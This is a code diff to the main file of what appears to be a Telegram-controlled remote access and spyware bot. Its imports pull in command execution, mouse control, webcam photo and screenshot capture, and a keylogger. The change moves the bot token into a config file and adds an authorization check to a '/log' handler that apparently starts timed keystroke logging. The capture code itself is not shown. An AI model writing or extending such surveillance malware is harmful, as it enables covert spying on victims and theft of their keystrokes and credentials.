@@ -4,13 +4,19 @@ from exec_commands import exec_command
 from control_functions import mouse_control, button_callback
 from media_capture import take_photo, take_screenshot
 from helpers import help_command
-from keylogger import start_logging
+from keylogger import start_logging, is_user_allowed
+from config import TOKEN
 import os
 
 # Your bot token
-TOKEN = 'insert your telegram bot token here'
+# TOKEN is now imported from config.py
 
 async def log_command(update, context):
+    user_id = update.effective_user.id
+    if not is_user_allowed(user_id):
+        await update.message.reply_text("You are not authorized to use this bot.")
+        return
+        
     try:
         # Parse duration from the command argument
         duration = int(context.args[0])  # Expecting "/log <duration_in_minutes>"
